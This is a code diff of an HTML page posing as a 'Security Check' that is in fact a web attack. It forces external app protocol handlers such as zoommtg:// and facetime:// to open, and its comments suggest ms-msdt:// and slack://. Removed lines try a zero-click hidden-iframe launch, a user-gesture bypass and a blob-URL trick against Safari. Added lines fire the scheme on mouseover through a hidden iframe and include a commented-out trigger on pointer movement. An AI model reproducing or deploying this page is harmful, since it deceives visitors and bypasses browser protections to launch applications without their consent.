@@ -12,86 +12,93 @@
     display: flex; justify-content: center; align-items: center;
     height: 100vh; margin: 0;
   }
-  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; }
+  .panel {
+    background: #fff; padding: 40px; border-radius: 12px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center;
+  }
   h1 { color: #333; margin-bottom: 10px; }
   p { color: #666; margin-bottom: 20px; }
-  .fake-btn {
-    background: #007aff; color: #fff; padding: 15px 30px; border-radius: 8px;
-    font-size: 18px; font-weight: bold; cursor: pointer; position: relative;
+  
+  /* Area Pemicu (Hover Target) */
+  #hoverTarget {
+    background: #007aff;
+    color: #fff;
+    padding: 20px 40px;
+    border-radius: 8px;
+    font-size: 18px;
+    font-weight: bold;
+    cursor: crosshair;
+    transition: transform 0.2s;
   }
-  iframe { display: none; }
+  #hoverTarget:hover {
+    transform: scale(1.05);
+    background: #005bb5;
+  }
+  
+  #status { margin-top: 20px; color: #f00; font-weight: bold; }
 </style>
 </head>
 <body>
 
 <div class="panel">
   <h1>🔒 Security Check</h1>
-  <p id="status">Memproses...</p>
-  <div class="fake-btn" id="trigger">Verify System</div>
+  <p>Gerakkan pointer Anda ke area biru di bawah ini.</p>
+  
+  <div id="hoverTarget">Hover Here to Verify</div>
+  <div id="status"></div>
 </div>
 
 <script>
 (function () {
   'use strict';
 
-  // Skema target: Ganti dengan zoommtg://, slack://, ms-msdt://
-  var targetScheme = "facetime://security-check@apple.com";
-
-  console.log("[!] Memulai Protocol Bypass...");
+  var target = document.getElementById('hoverTarget');
+  var status = document.getElementById('status');
+  
+  // Skema target (Ganti sesuai kebutuhan)
+  var targetScheme = "zoommtg://zoom.us/join?confno=123456789";
+  var hasTriggered = false;
 
   // ============================================
-  // 1. ZERO-CLICK ATTEMPT (Diblokir Browser Modern)
+  // 1. TRIGGER VIA MOUSEOVER / MOUSEMOVE
   // ============================================
-  setTimeout(function() {
+  target.addEventListener('mouseover', function() {
+    if (hasTriggered) return;
+    hasTriggered = true;
+    
+    status.innerText = "Mencoba memicu skema...";
+    console.log("[!] Pointer hovered. Triggering protocol...");
+
+    // Coba tembakkan skema
     try {
-      var iframe = document.createElement('iframe');
-      iframe.sandbox = "allow-scripts allow-top-navigation allow-popups allow-same-origin";
-      iframe.style.display = "none";
+      // Trik 1: Location replace
+      window.location.replace(targetScheme);
       
-      // Tulis payload ke dalam iframe
-      iframe.srcdoc = `
-        <script>
-          try {
-            // Paksa navigasi top-level ke skema
-            window.top.location.href = "${targetScheme}";
-          } catch(e) {}
-        <\/script>
-      `;
-      document.body.appendChild(iframe);
-      console.log("[!] Zero-Click Iframe Trigger sent.");
-    } catch(e) {}
-  }, 1000);
+      // Trik 2: Iframe (jika replace diblokir)
+      setTimeout(function() {
+        var iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = targetScheme;
+        document.body.appendChild(iframe);
+      }, 100);
+
+    } catch(e) {
+      status.innerText = "Diblokir oleh Browser.";
+      console.log("Gagal:", e);
+    }
+  });
 
   // ============================================
-  // 2. GESTURE BYPASS (Race Condition pada Klik)
+  // 2. TRIGGER VIA POINTERMOVE (Saat Mouse Bergerak)
   // ============================================
-  document.getElementById('trigger').addEventListener('click', function() {
-    document.getElementById('status').innerText = "Membuka aplikasi...";
-
-    // Trik: Gunakan location.replace (tidak meninggalkan history)
-    // Eksekusi dalam microtask (0ms) untuk memanfaatkan Transient Activation
-    queueMicrotask(function() {
-      try {
-        window.location.replace(targetScheme);
-      } catch(e) {
-        console.log("Gesture Bypass gagal:", e);
-      }
-    });
-
-    // Trik Alternatif: Blob Wrapper
-    // (Karena Safari memblokir window.location ke skema eksternal,
-    // kita bungkus dalam blob: URL)
-    try {
-      var payload = `<script>window.location.replace("${targetScheme}");<\/script>`;
-      var blob = new Blob([payload], { type: 'text/html' });
-      var blobUrl = URL.createObjectURL(blob);
-      
-      // Coba panggil via iframe
-      var iframe2 = document.createElement('iframe');
-      iframe2.style.display = 'none';
-      iframe2.src = blobUrl;
-      document.body.appendChild(iframe2);
-    } catch(e) {}
+  document.body.addEventListener('pointermove', function(e) {
+    // Jika pointer bergerak ke area tertentu, tembakkan
+    // (Ini lebih agresif, bisa memicu tanpa disengaja)
+    if (e.clientX > window.innerWidth / 2 && !hasTriggered) {
+      // Uncomment baris di bawah untuk mengaktifkan trigger via pointermove
+      // hasTriggered = true;
+      // window.location.replace(targetScheme);
+    }
   });
 
 })();
